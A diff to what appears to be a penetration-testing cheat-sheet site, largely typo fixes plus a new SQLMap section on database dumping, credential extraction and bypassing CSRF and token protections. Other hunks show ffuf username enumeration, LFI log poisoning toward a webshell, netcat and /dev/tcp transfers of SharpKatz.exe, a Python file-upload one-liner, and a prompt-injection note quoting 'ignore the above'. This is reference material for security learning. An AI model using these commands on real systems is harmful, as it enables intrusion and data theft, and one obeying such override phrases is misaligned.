@@ -663,7 +663,7 @@ Tool: nfs-common`,
                 title: "Authentication Bypass",
                 body: `## Username Enumeration
 
-### Filter by response recieved for a username that already exits:
+### Filter by response received for a username that already exists:
 
 &nbsp;<span class="cmd">ffuf -w /usr/share/wordlists/SecLists/Usernames/Names/names.txt -X POST -d "username=FUZZ&amp;password=x" -H "Content-Type: application/x-www-form-urlencoded" -u http://[MACHINE_IP]/loginpage.php -mr "[message for valid username]"</span>
 
@@ -838,7 +838,7 @@ This is stored in the table<span class="cmd"> global_variables</span> in <span c
 Can be used to write data from select queries into files  
 Usually used for exporting data from tables.  
 &nbsp;&nbsp;&nbsp;&nbsp;<span class="cmd">SELECT 'file written successfully!' into outfile '/var/www/html/proof.txt'</span>  
-Check the file proof.txt to see if it indeed exits.
+Check the file proof.txt to see if it indeed exists.
 
 ## Writing webshell
 
@@ -854,7 +854,7 @@ NOTE: all the placeholders/columns must be satisfied. for columns use open and c
                   {
                     slug: "sqlmap",
                     title: "SQLMap",
-                    body: `## General Options
+                    body: `# General Options
 
 | Flag | Description |  
 | --- | --- |  
@@ -867,7 +867,7 @@ NOTE: all the placeholders/columns must be satisfied. for columns use open and c
 | -t [file_name] | Stores whole traffic content to a file |  
 | --proxy [url] | Redirect traffic through a proxy, eg: burp |
 
-## Set up SQLMap request against target
+# Set up SQLMap request against target
 
 ### cURL Command
 
@@ -921,34 +921,109 @@ Eg: If the vulnerable code at the target is:
 
 SQLMap combines predefined set of common **boundaries** (prefix/suffix pairs), along with **vectors** having a high chance of success with a vulnerable target.  
 There is a possibility for users to use bigger sets of boundaries and vectors, so: options <span class="cmd">--level </span>and <span class="cmd">--risk</span> should be used:  
-<span class="cmd">--level</span> (1-5, default 1) extends **both vectors and boundaries** being used, based on **expectancy of success** (higher level, if expectancy of success is low).  
-<span class="cmd">--risk</span> (1-3, default 1) extends the **used vector** set based on their **risk of causing problems** at the target side (i.e., risk of database entry loss or denial-of-service).  
+<span class="cmd">--level=[num]</span> (1-5, default 1) extends **both vectors and boundaries** being used, based on **expectancy of success** (higher level, if expectancy of success is low).  
+<span class="cmd">--risk</span>=[num] (1-3, default 1) extends the **used vector** set based on their **risk of causing problems** at the target side (i.e., risk of database entry loss or denial-of-service).  
 NOTE: Use verbosity level of 3 or higher : Since, messages containing the used [PAYLOAD] will be displayed  
 Info: As for the number of payloads, by default (i.e. --level=1 --risk=1), the number of payloads used for testing a single parameter goes up to 72, while in the most detailed case (--level=5 --risk=3) the number of payloads increases to 7,865.
 
 ### Advanced Tuning
 
-**Status Codes**  
+Status Codes  
 <span class="cmd">--code [number]</span> : TRUE response detection to a specific HTTP status code.
 
-**Strings**  
+Strings  
 <span class="cmd">--string=[string_to_check]</span> : Fixed string appears only in TRUE responses
 
-**Text-only**  
+Text-only  
 <span class="cmd">--text-only</span> : Useful when hidden tags (<span class="cmd">&lt;script&gt;</span>,<span class="cmd"> &lt;style&gt;</span>, <span class="cmd">&lt;meta&gt;</span>, etc.) interfere with comparison
 
-**Techniques**  
+Techniques  
 <span class="cmd">--technique=[techniques_to_be_used]</span> : Restrict SQLMap to specific SQLi techniques. Useful to skip problematic techniques.  
 <span class="cmd">--technique=BEU</span> : Tests only Boolean-based blind, Error-based, and UNION-query, skips time-based blind and stacked queries  
 <span class="cmd">B</span>=Boolean-blind, <span class="cmd">E</span>=Error-based, <span class="cmd">U</span>=UNION-query, <span class="cmd">S</span>=Stacked queries, <span class="cmd">T</span>=Time-based blind (standard SQLMap notation)
 
-**UNION SQLi Tuning**
+UNION SQLi Tuning
 
 | Flag | Description |  
 | --- | --- |  
 | --union-cols=[num] | Specify number of columns for UNION query |  
 | --union-char=['a'] | Set custom "dummy" fill value (replaces default NULL/random int) |  
-| --union-from=[table] | Set FROM table appendix required by some DBMS (e.g. Oracle) |`,
+| --union-from=[table] | Set FROM table appendix required by some DBMS (e.g. Oracle) |
+
+# Database Enumeration
+
+## Basic DB Enum
+
+<span class="cmd">--banner</span> : Database version banner   
+<span class="cmd">--current-user</span> : Current user name  
+<span class="cmd">--current-db</span> : Current database name  
+<span class="cmd">--is-dba</span> : Checking if the current user has DBA (administrator) rights  
+<span class="cmd">--dbs</span> : Enumerates and lists all databases
+
+NOTE: To retrive content: <span class="cmd">--dump</span> must be used
+
+## Table Enum
+
+<span class="cmd">--tables</span> : List all the tables  
+<span class="cmd">-T [table_name]</span>  
+<span class="cmd">-D [database_name]</span>  
+<span class="cmd">-C [col1, col2]</span>  
+<span class="cmd">sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb</span>  
+Conditional: To retrieve certain rows based on a known WHERE condition (e.g. name LIKE 'f%')  
+<span class="cmd">sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb --where="name LIKE 'f%'"</span>
+
+## Full DB Enumeration
+
+<span class="cmd">--dump</span> : **Current** database content will be retrieved.  
+<span class="cmd">--dump-all</span> : Content from **all** the databases will be retrieved.  
+<span class="cmd">--exclude-sysdbs</span> : 	Skip the retrieval of content from system databases.
+
+## DB Schema Enumeration
+
+<span class="cmd">--schema</span> : Database architecture, desc command of SQL
+
+## Search for Data
+
+<span class="cmd">--search</span> : Used to search for databases, tables or column names  
+Eg: Search for tables that contain the keyword user:  
+&nbsp;&nbsp;&nbsp;&nbsp;<span class="cmd">sqlmap -u "http://www.example.com/?id=1" --search -T user</span>  
+&nbsp;&nbsp;&nbsp;&nbsp;Search for columns that contain the keyword user:  
+&nbsp;&nbsp;&nbsp;&nbsp;<span class="cmd">sqlmap -u "http://www.example.com/?id=1" --search -C pass</span>
+
+## Password Enumeration
+
+### User creds from other database
+
+• Search for colums containing keywords related to username and passwords  
+• Dump the table entries:  
+<span class="cmd">sqlmap -u "http://www.example.com/?id=1" --dump -D [database] -T [table]</span>
+
+### System creds
+
+<span class="cmd">sqlmap -u "http://www.example.com/?id=1" --passwords --batch</span>
+
+# Bypassing Webapp Protections
+
+## Anti-CSRF Token Bypass
+
+Specify parameter name and it automatically parses response content and search for fresh tokens  
+<span class="cmd">--csrf-token="[token_parameter_name]"</span>  
+<span class="cmd">sqlmap -u "http://www.example.com/" --data="id=1&amp;[csrf-token]=[WfF1szMUHhiokx9AHFply5L2xAOfjRkE]" --csrf-token="[csrf-token]"</span>
+
+## Unique Value Bypass
+
+Some parameters must contain unique values in new requests that are sent  
+<span class="cmd">--randomize=["token_parameter_name"]</span>  
+<span class="cmd">sqlmap -u "http://www.example.com/?id=1&amp;[rp]=29125" --randomize=[rp</span>]
+
+## Calculated Parameter Bypass
+
+Sometimes a parameter's value is obtained after a calculation based on some other parameter.  
+<span class="cmd">--eval="[python_inline_code"</span> should be used, which evaluates valid Python code just before sending the request.  
+<span class="cmd">sqlmap -u "http://www.example.com/?id=1&amp;h=c4ca4238a0b923820dcc509a6f75849b" --eval="import hashlib; h=hashlib.md5(id).hexdigest()" </span>  
+The paramter in the url or data field must match in the contents of <span class="cmd">--eval</span> flag.
+
+## IP Address Concealing`,
                   },
                 ],
               },
@@ -1104,7 +1179,7 @@ NOTE: expect is external wrapper and must be manually installed in backend
 Eg: <span class="cmd">http://127.0.0.1:80/index.php</span>  
 <span class="cmd">http://[MACHINE_IP]:[PORT]/index.php?language=http://127.0.0.1:80/index.php</span>  
 NOTE:  
-&nbsp;&nbsp;&nbsp;&nbsp;If the PHP code gets rendered and just not displayed, then the vulnerable funciton also allows PHP execution  
+&nbsp;&nbsp;&nbsp;&nbsp;If the PHP code gets rendered and just not displayed, then the vulnerable function also allows PHP execution  
 &nbsp;&nbsp;&nbsp;&nbsp;It may not be ideal to include the vulnerable page itself (i.e. index.php), as this may cause a recursive inclusion loop and cause a DoS to the back-end server.
 
 ### Remote Code Execution with RFI
@@ -1205,7 +1280,7 @@ NOTE: To execute another command, session file has to be poisoned with the web s
 &nbsp;&nbsp;&nbsp;&nbsp;Use poisoned webshell to write permanent webshell or to send reverse shell.
 
 **Server Log Poisoning**  
-General ino: Both Apache and Nginx maintain log files, such as <span class="cmd">access.log</span> (info about requests made to the server, including User-Agent header) and <span class="cmd">error.log</span>. We can control User-Agent header, we can use it to poison the server logs as we did above.   
+General info: Both Apache and Nginx maintain log files, such as <span class="cmd">access.log</span> (info about requests made to the server, including User-Agent header) and <span class="cmd">error.log</span>. We can control User-Agent header, we can use it to poison the server logs as we did above.   
 &nbsp;&nbsp;&nbsp;&nbsp;Once poisoned, include the logs through the LFI; read-access required over the logs.   
 &nbsp;&nbsp;&nbsp;&nbsp;Nginx logs are readable by low privileged users by default (e.g. www-data).   
 &nbsp;&nbsp;&nbsp;&nbsp;Apache logs are only readable by high privileged users (e.g. root/adm groups). In older or misconfigured servers, these may be readable by low-privileged users.  
@@ -1788,10 +1863,10 @@ Storing and listing credentials and loot
 
 <span class="cmd">nc -nlvp [PORT] &lt; [file_to_send]</span>
 
-### Reciever:
+### Receiver:
 
 <span class="cmd">nc [Sender_IP] [PORT] &gt; [outputfile]</span>  
-If reciever doesn't have nc, use<span class="cmd"> /dev/tcp</span>  
+If Receiver doesn't have nc, use<span class="cmd"> /dev/tcp</span>  
 <span class="cmd">cat &lt; /dev/tcp/192.168.49.128/443 &gt; SharpKatz.exe</span>
 
 ## Python webserver
@@ -2141,12 +2216,12 @@ Files accessible from the location this is executed
 
 ### Upload with Python
 
-Starting the Python uploadserver - reciever  
+Starting the Python uploadserver - Receiver  
 <span class="cmd">python3 -m uploadserver </span>
 
 Uploading a File - sender  
 <span class="cmd">python3 -c 'import requests;requests.post("[MACHINE_IP]:8000/upload",files={"files":open("[full_path_of_file]","rb")})'</span>  
-machine_ip is reciever's ip
+machine_ip is Receiver's ip
 
 # PHP
 
@@ -2292,7 +2367,7 @@ Verify if file is present:
 
 <span class="cmd">find / -type f -perm 0777</span> : Files with the 777 permissions (files readable, writable, and executable by all users)   
 <span class="cmd">find / -perm a=x</span> : Executable files  
-Writeable folders:  
+writable folders:  
 &nbsp;&nbsp;&nbsp;&nbsp;<span class="cmd">find / -writable -type d 2&gt;/dev/null</span>  
 &nbsp;&nbsp;&nbsp;&nbsp;<span class="cmd">find / -perm -o w -type d 2&gt;/dev/null</span>  
 Executable folders	  
@@ -3343,7 +3418,7 @@ Learning these somewhat small things can sometimes have quite dramatic psycholog
 
 If an attacker mimics the format of a trusted instruction, the model often can't tell the difference. Whether it's "ignore the above" or a more subtle phrasing, the attack succeeds because the model treats it as just another plausible continuation.
 
-## Seperation of roles in context window
+## Separation of roles in context window
 
 ### ChatML
 
